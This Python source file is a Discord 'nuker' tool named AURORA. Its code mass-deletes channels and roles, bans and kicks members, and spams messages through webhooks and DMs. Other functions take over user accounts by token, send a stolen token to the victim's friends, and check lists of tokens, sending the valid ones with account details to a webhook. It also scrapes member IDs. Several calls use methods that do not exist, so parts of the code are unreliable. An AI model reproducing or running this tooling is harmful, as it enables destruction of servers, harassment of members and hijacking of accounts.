import discord
from discord.ext import commands
import asyncio
import random
import os
import aiohttp
from asyncio import sleep
import subprocess
import base64
import threading
import string
import time
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
import pyautogui
import math
import sys

# Check and install required modules
required_modules = ["discord", "Pillow", "pyautogui", "aiohttp"]
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        print(f"Module '{module}' not found. Installing...")
        subprocess.check_call(["pip", "install", module])

intents = discord.Intents.all()
client = commands.Bot(command_prefix='!', intents=intents)

token = input("Enter your Discord Bot Token: ")
webhook_url = None
multiple_tokens = []
current_guild = None
thread_count = 5
safe_mode = False
rate_limit_count = 0

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def rgb_to_ansi(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

async def handle_rate_limit(e):
    global rate_limit_count
    print(f"\033[38;2;255;0;0mRate limited: {e}\033[0m")
    rate_limit_count += 1
    if rate_limit_count >= 3:
        print("\033[38;2;255;0;0mRate limited too many times. Returning to main menu.\033[0m")
        await main_menu()
        rate_limit_count = 0
    else:
        await asyncio.sleep(2)

async def delete_channels():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    try:
        await current_guild.delete_channels(reason="Deleted by AURORA")
        print("\033[38;2;0;255;0mFinished deleting channels.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def create_vcs():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    name = input("Enter the name for the VCs: ")
    quantity = int(input("Enter the number of VCs to create: "))
    try:
        await current_guild.create_voice_channels(name=name, count=quantity, reason="Created by AURORA")
        print(f"\033[38;2;0;255;0mFinished creating {quantity} VCs.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def create_channels():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    name = input("Enter the name for the channels: ")
    quantity = int(input("Enter the number of channels to create: "))
    try:
        await current_guild.create_text_channels(name=name, count=quantity, reason="Created by AURORA")
        print(f"\033[38;2;0;255;0mFinished creating {quantity} channels.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def spam_messages():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    message = input("Enter the message to spam: ")
    amount = int(input("Enter the number of messages per channel: "))
    webhook_count = int(input("Enter the number of webhooks to create per channel: "))

    async def spam_channel(channel, message, amount, webhook_count):
        try:
            webhooks = await asyncio.gather(*[channel.create_webhook(name=f"AURORA-{i}") for i in range(webhook_count)])
        except discord.Forbidden:
            print(f"\033[38;2;255;0;0mMissing permissions to create webhooks in channel: {channel.name}\033[0m")
            return
        except discord.HTTPException as e:
            print(f"\033[38;2;255;0;0mFailed to create webhook in channel: {channel.name}, Error: {e}\033[0m")
            return
        send_tasks = [webhook.send(message) for _ in range(amount) for webhook in webhooks]
        try:
            await asyncio.gather(*send_tasks)
        except discord.HTTPException as e:
            await handle_rate_limit(e)
            return
        await asyncio.gather(*[webhook.delete() for webhook in webhooks])

    try:
        await asyncio.gather(*(spam_channel(channel, message, amount, webhook_count) for channel in current_guild.text_channels))
        print(f"\033[38;2;0;255;0mFinished spamming messages in {len(current_guild.text_channels)} channels.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def advertise():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    my_github_url = "https://github.com/ShroomStumper"
    message = f"@everyone @here AURORA ON TOP COME GET IT NOW {my_github_url}\n{my_github_url}\n{my_github_url}"
    try:
        channel_tasks = [channel.edit(name="AURORA") for channel in current_guild.channels]
        member_tasks = [member.edit(nick="AURORA") for member in current_guild.members if member != client.user]
        send_tasks = [channel.send(message) for channel in current_guild.text_channels]
        await asyncio.gather(*channel_tasks)
        await asyncio.gather(*member_tasks)
        await asyncio.gather(*send_tasks)
        await current_guild.edit(name="AURORA")
        print("\033[38;2;0;255;0mSuccessfully advertised AURORA.\033[0m")
        rate_limit_count = 0
    except discord.Forbidden:
        print("\033[38;2;255;0;0mMissing permissions to rename the guild.\033[0m")
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def dm_all_users():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    message = input("Enter the message to DM all users: ")
    amount = int(input("Enter the number of times to send the message: "))

    async def dm_user(member, message, amount):
        if member != client.user:
            try:
                for _ in range(amount):
                    await member.send(message)
            except discord.Forbidden:
                pass
            except discord.HTTPException as e:
                await handle_rate_limit(e)

    try:
        dm_tasks = [dm_user(member, message, amount) for member in current_guild.members]
        await asyncio.gather(*dm_tasks)
        print(f"\033[38;2;0;255;0mFinished DMing all users.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def ban_all_users():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        await current_guild.ban(reason="Banned by AURORA")
        print("\033[38;2;0;255;0mFinished banning all users.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def unban_all_users():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        bans = await current_guild.bans()
        await current_guild.unban(reason="Unbanned by AURORA")
        print("\033[38;2;0;255;0mFinished unbanning users.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def kick_all_users():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        await current_guild.kick(reason="Kicked by AURORA")
        print("\033[38;2;0;255;0mFinished kicking all users.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def server_rename():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    new_name = input("Enter the new name for the server: ")
    try:
        await current_guild.edit(name=new_name)
        print(f"\033[38;2;0;255;0mRenamed server to: {new_name}\033[0m")
        rate_limit_count = 0
    except discord.Forbidden:
        print("\033[38;2;255;0;0mMissing permissions to rename the server.\033[0m")
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def change_server_banner():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    file_path = pyautogui.prompt("Enter the file path to the banner image:")
    if not file_path:
        print("No file path entered.")
        return
    try:
        with open(file_path, "rb") as f:
            banner = f.read()
        await current_guild.edit(banner=banner)
        print("\033[38;2;0;255;0mChanged server banner successfully.\033[0m")
        rate_limit_count = 0
    except discord.Forbidden:
        print("\033[38;2;255;0;0mMissing permissions to change server banner.\033[0m")
    except discord.HTTPException as e:
        await handle_rate_limit(e)
    except FileNotFoundError:
        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m")

async def change_server_profile():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    file_path = pyautogui.prompt("Enter the file path to the profile image:")
    if not file_path:
        print("No file path entered.")
        return

    try:
        with open(file_path, "rb") as f:
            icon = f.read()
        await current_guild.edit(icon=icon)
        print("\033[38;2;0;255;0mChanged server profile picture successfully.\033[0m")
        rate_limit_count = 0
    except discord.Forbidden:
        print("\033[38;2;255;0;0mMissing permissions to change server profile picture.\033[0m")
    except discord.HTTPException as e:
        await handle_rate_limit(e)
    except FileNotFoundError:
        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m")

async def delete_all_webhooks():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        webhooks = await current_guild.webhooks()
        await asyncio.gather(*[webhook.delete() for webhook in webhooks])
        print("\033[38;2;0;255;0mFinished deleting webhooks.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def create_webhooks():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    name = input("Enter the name for the webhooks: ")
    quantity = int(input("Enter the number of webhooks to create: "))

    try:
        await current_guild.create_webhooks(name=name, count=quantity)
        print(f"\033[38;2;0;255;0mFinished creating {quantity} webhooks.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def token_leaker():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    message = f"@everyone @here AURORA ON TOP {token}"
    try:
        await current_guild.send(message)
        print("\033[38;2;0;255;0mFinished leaking token.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def leave_server():
    global rate_limit_count, current_guild
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    try:
        await current_guild.leave()
        print("\033[38;2;0;255;0mLeft the server successfully.\033[0m")
        current_guild = None
        await select_guild()
        await main_menu()
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def join_server():
    global rate_limit_count, current_guild
    invite_link = input("Enter the invite link to the server: ")
    try:
        invite = await client.fetch_invite(invite_link)
        await invite.accept()
        print(f"\033[38;2;0;255;0mJoined server: {invite.guild.name}\033[0m")
        current_guild = invite.guild
        rate_limit_count = 0
    except discord.NotFound:
        print("\033[38;2;255;0;0mInvalid invite link.\033[0m")
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def my_youtube():
    print("\033[38;2;0;255;0mMy Youtube Channel: https://www.youtube.com/@FentAddictAxe\033[0m")

async def my_github():
    print("\033[38;2;0;255;0mMy Github: https://github.com/ShroomStumper\033[0m")

async def my_discord():
    print("\033[38;2;0;255;0mMy Discord: 5td1#0001\033[0m")

async def load_multiple_tokens():
    global rate_limit_count, multiple_tokens
    filepath = pyautogui.prompt("Enter the file path to the .txt file containing the tokens (one per line):")
    if filepath is None:
        print("\033[38;2;255;0;0mFile path not provided. Returning to the menu.\033[0m")
        return

    try:
        with open(filepath, 'r') as f:
            tokens = [token.strip() for token in f.readlines()]

        async def verify_and_join(token):
            try:
                temp_bot = commands.Bot(command_prefix="!", intents=intents)
                await temp_bot.login(token)
                print(f"\033[38;2;0;255;0mValid token: {temp_bot.user}\033[0m")

                if current_guild and current_guild not in temp_bot.guilds:
                    for channel in current_guild.text_channels:
                        try:
                            invite = await channel.create_invite(max_age=0, max_uses=1) 
                            await temp_bot.fetch_invite(invite.url)
                            await invite.accept() 
                            print(f"\033[38;2;0;255;0mBot {temp_bot.user} joined the server.\033[0m")
                            break
                        except discord.Forbidden:
                            print(f"\033[38;2;255;0;0mMissing permissions to create invite in: {channel.name}\033[0m")
                        except discord.HTTPException as e: 
                            await handle_rate_limit(e)
                multiple_tokens.append(temp_bot)
            except discord.LoginFailure:
                print(f"\033[38;2;255;0;0mInvalid token: {token}\033[0m")
            except Exception as e:
                print(f"\033[38;2;255;0;0mError veryfing token: {token}, Error: {e}\033[0m")
            finally: 
                await temp_bot.close() 

        await asyncio.gather(*(verify_and_join(token) for token in tokens))
        print(f"\033[38;2;0;255;0mLoaded {len(multiple_tokens)} valid tokens.\033[0m")
        rate_limit_count = 0

    except FileNotFoundError:
        print(f"\033[38;2;255;0;0mFile not found: {filepath}\033[0m")

async def account_nuker():
    global rate_limit_count
    user_token = input("Enter the user token to nuke: ")

    async def nuke_account(token):
        try:
            user_bot = commands.Bot(command_prefix="!", intents=intents)
            await user_bot.login(token) 
            user = await user_bot.fetch_user(user_bot.user.id) 

            if input("Change display name? (Y/N): ").lower() == "y":
                new_name = input("Enter a new display name: ")
                await user.edit(username=new_name) 
                print(f"\033[38;2;0;255;0mChanged display name to: {new_name}.\033[0m") 
            if input("Change bio? (Y/N): ").lower() == "y": 
                new_bio = input("Enter a new bio: ")
                await user.edit(bio=new_bio)
                print(f"\033[38;2;0;255;0mChanged Bio.\033[0m") 

            if input("Change Profile Picture? (Y/N): ").lower() == "y": 
                path = pyautogui.prompt("Enter the file path for the profile image: ")
                if path: 
                    with open(path, "rb") as f:
                        icon = f.read()
                    await user.edit(avatar=icon)
                    print(f"\033[38;2;0;255;0mChanged profile picture.\033[0m") 

            if input("Change Banner? (Y/N): ").lower() == "y":
                path = pyautogui.prompt("Enter the file path to the banner image: ") 
                if path: 
                    try:
                        with open(path, "rb") as f:
                            banner = f.read()
                        await user.edit(banner=banner)
                        print(f"\033[38;2;0;255;0mChanged Banner.\033[0m") 
                    except discord.HTTPException as e:
                        print(f"\033[38;2;255;0;0mError changing banner: {e}. Check if the file size is too big.\033[0m" ) 

            if input("Leak user Token? (Y/N): ").lower() == "y": 
                for friend in user.friends:
                    try:
                        await friend.send(f"The token used for this is: {token}")
                        print(f"\033[38;2;0;255;0mSent Token to: {friend.name}\033[0m") 
                    except discord.Forbidden:
                        print(f"\033[38;2;255;0;0mCould not send token to: {friend.name}.\033[0m") 
            if input("Advertise in Servers? (Y/N): ").lower() == "y": 
                message = input("Enter the message to advertise: ") 
                for guild in user_bot.guilds:
                    for channel in guild.text_channels:
                        try:
                            await channel.send(message)
                            print(f"\033[38;2;0;255;0mAdvertised in: {guild.name} - {channel.name}.\033[0m")
                        except discord.Forbidden:
                            print(f"\033[38;2;255;0;0mMissing permissions to send messages in channel: {channel.name}.\033[0m")
                        except discord.HTTPException as e:
                            await handle_rate_limit(e)

            if input("Advertise Nuker? (Y/N): ").lower() == "y": 
                for friend in user.friends:
                    try:
                        await friend.send("AURORA ON TOP") 
                        await friend.send("https://github.com/ShroomStumper")
                        print(f"\033[38;2;0;255;0mAdvertised Aurora to: {friend.name}.\033[0m") 

                    except discord.Forbidden:
                        print(f"\033[38;2;255;0;0mCould not Advertise to: {friend.name}.\033[0m")
                    except discord.HTTPException as e:
                        await handle_rate_limit(e)

        except discord.LoginFailure:
            print(f"\033[38;2;255;0;0mFailed to log in with user token: {token}.\033[0m")

        except Exception as e: 
            print(f"\033[38;2;255;0;0mAn Error occured during Account Nuking, Error: {e}\033[0m")
        finally: 
            try:
                await user_bot.close() 
            except: 
                pass 
    try:
        await nuke_account(user_token)
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def server_cloner():
    global rate_limit_count
    user_token = input("Enter your user Token: ")
    server_id_to_clone = int(input("Enter the Server ID to Clone: "))
    destination_server_id = int(input("Enter the Destination Server ID: "))

    async def clone_server(user_token, server_id_to_clone, destination_server_id): 
        try:
            user_bot = commands.Bot(command_prefix="!", intents=intents)
            await user_bot.login(user_token) 
            guild_to_clone = user_bot.get_guild(server_id_to_clone) 
            destination_guild = user_bot.get_guild(destination_server_id) 

            if guild_to_clone and destination_guild:
                if (
                    input(f"Are you sure you want to replicate {guild_to_clone.name} to {destination_guild.name}? (Y/N): ").lower()
                    == "y"
                ):
                    channel_delete_tasks = [channel.delete() for channel in destination_guild.channels]
                    await asyncio.gather(*channel_delete_tasks)

                    role_delete_tasks = [role.delete() for role in destination_guild.roles[1:]]
                    await asyncio.gather(*role_delete_tasks)

                    text_channel_create_tasks = []
                    for channel in guild_to_clone.text_channels:
                        overwrites = {}
                        for overwrite in channel.overwrites:
                            if isinstance(overwrite, discord.Role):
                                role_name = overwrite.name
                                new_role = discord.utils.get(destination_guild.roles, name=role_name)
                                if new_role:
                                    overwrites[new_role] = channel.overwrites[overwrite]
                            else: 
                                member_name = str(overwrite) 
                                new_member = destination_guild.get_member_named(member_name)
                                if new_member:
                                    overwrites[new_member] = channel.overwrites[overwrite]
                        text_channel_create_tasks.append(destination_guild.create_text_channel(name=channel.name, overwrites=overwrites))
                    await asyncio.gather(*text_channel_create_tasks)

                    voice_channel_create_tasks = [destination_guild.create_voice_channel(name=channel.name, overwrites=channel.overwrites) for channel in guild_to_clone.voice_channels] 
                    await asyncio.gather(*voice_channel_create_tasks)

                    role_create_tasks = [destination_guild.create_role(
                        name=role.name,
                        permissions=role.permissions,
                        color=role.color,
                        hoist=role.hoist,
                        mentionable=role.mentionable
                    ) for role in guild_to_clone.roles[1:]]
                    await asyncio.gather(*role_create_tasks)

                    member_edit_tasks = []
                    for member in destination_guild.members: 
                        clone_member = guild_to_clone.get_member(member.id)
                        if clone_member and clone_member.nick:
                            member_edit_tasks.append(member.edit(nick=clone_member.nick)) 
                    await asyncio.gather(*member_edit_tasks)

                    try:
                        with open(guild_to_clone.icon_url, 'rb') as f: 
                            icon = f.read() 
                        await destination_guild.edit(icon=icon)
                    except:
                        pass

                    try:
                        with open(guild_to_clone.banner_url, 'rb') as f: 
                            banner = f.read() 
                        await destination_guild.edit(banner=banner)
                    except:
                        pass 

                    print("\033[38;2;0;255;0mFinished server cloning.\033[0m") 
                else: 
                    print("\033[38;2;255;0;0mServer cloning aborted.\033[0m") 
            else: 
                print("\033[38;2;255;0;0mInvalid Guild IDs provided.\033[0m") 

        except discord.LoginFailure:
            print(f"\033[38;2;255;0;0mFailed to log in with user token: {user_token}\033[0m") 
        except Exception as e:
            print(f"\033[38;2;255;0;0mAn error occured during Server Cloning, Error: {e}.\033[0m")
        finally: 
            await user_bot.close()  

    try:
        await clone_server(user_token, server_id_to_clone, destination_server_id)
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def full_nuke():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        await delete_channels()
        await delete_all_roles() 
        await delete_vcs()
        await delete_all_webhooks()
        await current_guild.edit(name="FUCKED BY AURORA")
        print("\033[38;2;0;255;0mFinished full nuke.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def nickname_all():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return
    nickname = input("Enter the new nickname for all members: ")

    try:
        await current_guild.edit(nick=nickname)
        print("\033[38;2;0;255;0mFinished changing nicknames.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def member_id_scraper():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    member_ids = [member.id for member in current_guild.members]
    print(f"\033[38;2;0;255;0mScraped {len(member_ids)} Member IDs\033[0m")
    print(member_ids)

    if webhook_url:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, adapter=discord.webhook.AsyncWebhookAdapter(session))
            await webhook.send(f"Scraped {len(member_ids)} Member IDs:\n{member_ids}")

    else:
        print("\033[38;2;255;0;0mNo webhook set. Please set a webhook using '!set_webhook'.\033[0m")

async def change_bot_token():
    global rate_limit_count, token
    new_token = input("Enter the new bot token: ")
    try:
        await client.close()
        client.http.token = new_token
        await client.start(new_token)
        token = new_token
        print("\033[38;2;0;255;0mBot token changed successfully.\033[0m")
        rate_limit_count = 0
    except discord.LoginFailure:
        print("\033[38;2;255;0;0mInvalid token provided.\033[0m")
    except Exception as e:
        await handle_rate_limit(e)

async def change_server():
    global rate_limit_count
    if len(client.guilds) <= 1:
        print("\033[38;2;255;0;0mBot is only in one server.\033[0m")
        return
    await select_guild()
    await main_menu()

async def strip_roles_from_members():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        for member in current_guild.members:
            if member != client.user:
                await member.remove_roles(*member.roles[1:])
        print("\033[38;2;0;255;0mFinished stripping roles from members.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def delete_all_roles():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        for role in current_guild.roles[1:]: 
            await role.delete()
        print("\033[38;2;0;255;0mFinished deleting roles.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def create_roles():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    name = input("Enter the new role name: ")
    admin = input("Should the role be an admin role? (Y/N): ").lower() == "y"

    try:
        permissions = discord.Permissions(administrator=admin) 
        await current_guild.create_role(name=name, permissions=permissions) 
        print(f"\033[38;2;0;255;0mCreated role: {name}\033[0m") 
        rate_limit_count = 0
    except discord.Forbidden:
        print(f"\033[38;2;255;0;0mMissing permission to create roles.\033[0m") 
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def role_all_users():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    print("Available Roles: ")
    for i, role in enumerate(current_guild.roles):
        if role.name != "@everyone": 
            print(f"{i+1}. {role.name}") 

    try:
        choice = int(input("Enter the number of the role to give to all users: "))
        selected_role = current_guild.roles[choice]

        for member in current_guild.members: 
            if member != client.user:
                await member.add_roles(selected_role)
        print(f"\033[38;2;0;255;0mFinished giving {selected_role.name} to all users!\033[0m")
        rate_limit_count = 0
    except (ValueError, IndexError):
        print("\033[38;2;255;0;0mInvalid role choice.\033[0m")
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def reaction_spam():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    emoji = input("Enter the emoji to spam: ")

    async def spam_channel(channel, emoji):
        async for message in channel.history(limit=100): 
            try:
                await message.add_reaction(emoji)
            except discord.Forbidden: 
                print(f"\033[38;2;255;0;0mMissing permissions to add reactions in {channel.name}\033[0m")
                break 
            except discord.HTTPException as e: 
                await handle_rate_limit(e)
                break

    try:
        await asyncio.gather(*(spam_channel(channel, emoji) for channel in current_guild.text_channels)) 
        print("\033[38;2;0;255;0mFinished reaction spamming!\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def vc_audio_spammer():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    voice_channels = current_guild.voice_channels
    if not voice_channels:
        print("\033[38;2;255;0;0mNo voice channels found in the server.\033[0m")
        return 

    print("Available Voice Channels: ")
    for i, channel in enumerate(voice_channels): 
        print(f"{i + 1}. {channel.name}") 

    while True: 
        choice = input("Enter the voice channel number to spam: ") 
        try:
            choice = int(choice)
            selected_channel = voice_channels[choice - 1]
            break
        except (ValueError, IndexError):
            print("\033[38;2;255;0;0mInvalid choice. Please enter a valid number.\033[0m") 

    file_path = pyautogui.prompt("Enter the file path to the .mp3 file: ") 
    if not file_path:
        print("No file path entered.")
        return

    try: 
        voice_client = await selected_channel.connect() 
        print(f"\033[38;2;0;255;0mJoined voice channel: {selected_channel.name}.\033[0m") 
        
        while True:
            try:
                audio_source = discord.FFmpegPCMAudio(file_path)
                voice_client.play(audio_source) 
                print(f"\033[38;2;0;255;0mPlaying audio: {os.path.basename(file_path)} in: {selected_channel.name}\033[0m")
                while voice_client.is_playing():
                    await asyncio.sleep(1)
            except discord.ClientException as e:
                await handle_rate_limit(e)
                break 

        await voice_client.disconnect() 
        print(f"\033[38;2;0;255;0mDisconnected from voice: {selected_channel.name}\033[0m")

    except discord.ClientException as e:
        await handle_rate_limit(e)
    except FileNotFoundError:
        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m")

async def account_checker():
    global rate_limit_count
    file_path = pyautogui.prompt("Enter the file path to the .txt file containing the tokens to check: ")
    if not file_path:
        print("No file path entered.")
        return

    valid_tokens = []
    invalid_tokens = []

    async def check_token(token): 
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}) as resp: 
                    if resp.status == 200: 
                        user_data = await resp.json() 
                        creation_date = datetime.fromtimestamp(((int(user_data["id"]) >> 22) + 1420070400000) / 1000) 
                        year_created = creation_date.year
                        has_nitro = bool(user_data.get("premium_type"))
                        billing_info = "Not Checked"
                        valid_tokens.append(
                            f"""Token: {token}
                            Username: {user_data['username']}#{user_data['discriminator']}
                            Created: {year_created}
                            Nitro: {has_nitro}
                            Billing Info: {billing_info}\n""" 
                            )
                    else:
                        invalid_tokens.append(f"Invalid Token: {token}") 
        except Exception as e:
            print(f"\033[38;2;255;0;0mError checking token {token}: {e}\033[0m") 
            invalid_tokens.append(f"Error checking Token: {token}")

    try: 
        with open(file_path, 'r')as f: 
            tokens = [line.strip() for line in f] 
        await asyncio.gather(*(check_token(token) for token in tokens)) 
    except FileNotFoundError: 
        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m") 
        return
    except discord.HTTPException as e:
        await handle_rate_limit(e)

    if webhook_url:
        try:
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(webhook_url, adapter=discord.webhook.AsyncWebhookAdapter(session))
                if valid_tokens:
                    await webhook.send("Valid Tokens: \n" + '\n'.join(valid_tokens))
                if invalid_tokens:
                    await webhook.send("--------------\nInvalid/Error Tokens: \n" + '\n'.join(invalid_tokens))
            print(f"\033[38;2;0;255;0mAccount check results sent to webhook: {webhook_url}\033[0m")
            rate_limit_count = 0
        except discord.HTTPException as e:
            await handle_rate_limit(e)
    else: 
        print("\033[38;2;255;0;0mNo webhook set. Printing results...\033[0m") 
        if valid_tokens: 
            print("\nValid Tokens:\n" + '\n'.join(valid_tokens)) 
        if invalid_tokens: 
            print("\n--------------\nInvalid/Error Tokens:\n" + '\n'.join(invalid_tokens))

async def set_webhook():
    global rate_limit_count, webhook_url
    webhook_url = input("Enter the Webhook URL: ")
    print(f"\033[38;2;0;255;0mWebhook URL set to: {webhook_url}\033[0m")
    rate_limit_count = 0

async def unset_webhook():
    global rate_limit_count, webhook_url
    webhook_url = None
    print("\033[38;2;0;255;0mWebhook URL unset.\033[0m")
    rate_limit_count = 0

async def status():
    global rate_limit_count
    if client.is_ready():
        print(f"\033[38;2;0;255;0mThe bot is online\033[0m")
    else:
        print(f"\033[38;2;255;0;0mThe bot is offline\033[0m")
    rate_limit_count = 0

async def change_thread_count():
    global rate_limit_count, thread_count
    new_count = int(input(f"Enter the new thread count (currently {thread_count}): "))
    if new_count > 0:
        thread_count = new_count
        print(f"\033[38;2;0;255;0mThread count changed to {thread_count}.\033[0m")
    else:
        print("\033[38;2;255;0;0mInvalid thread count, enter a number greater than 0.\033[0m")
    rate_limit_count = 0

async def delete_vcs():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        voice_channels = current_guild.voice_channels
        await asyncio.gather(*[channel.delete() for channel in voice_channels]) 
        print(f"\033[38;2;0;255;0mFinished deleting VCs!\033[0m") 
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def exit_program():
    global rate_limit_count
    print("\033[38;2;255;0;0mExiting...\033[0m")
    await client.close()
    exit()

async def select_guild(): 
    global rate_limit_count, current_guild
    if len(client.guilds) <= 1:
        current_guild = client.guilds[0]
        print(f"\033[38;2;0;255;0mAutomatically selected the only guild: {current_guild.name}\033[0m")
        return

    print("Available Guilds: ")
    for i, guild in enumerate(client.guilds):
        print(f"{i + 1}. {guild.name}")

    while True: 
        choice = input("Choose a Guild (enter number): ")
        try:
            guild_index = int(choice) - 1 
            if 0 <= guild_index < len(client.guilds): 
                current_guild = client.guilds[guild_index]
                print(f"\033[38;2;0;255;0mSelected guild: {current_guild.name}\033[0m")
                return 
            else:
                print(f"\033[38;2;255;0;0mInvalid guild choice. Please enter a number from the list.\033[0m")
        except ValueError:
            print("\033[38;2;255;0;0mInvalid input. Please enter a number.\033[0m") 

def random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

async def create_random_channels(quantity, channel_type):
    global rate_limit_count
    if not current_guild:
        print(f"\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    try:
        create_tasks = []
        for _ in range(quantity):
            name = random_string(random.randint(5, 15))  
            if channel_type == "text":
                create_tasks.append(current_guild.create_text_channel(name))
            elif channel_type == "voice":
                create_tasks.append(current_guild.create_voice_channel(name))
        await asyncio.gather(*create_tasks)
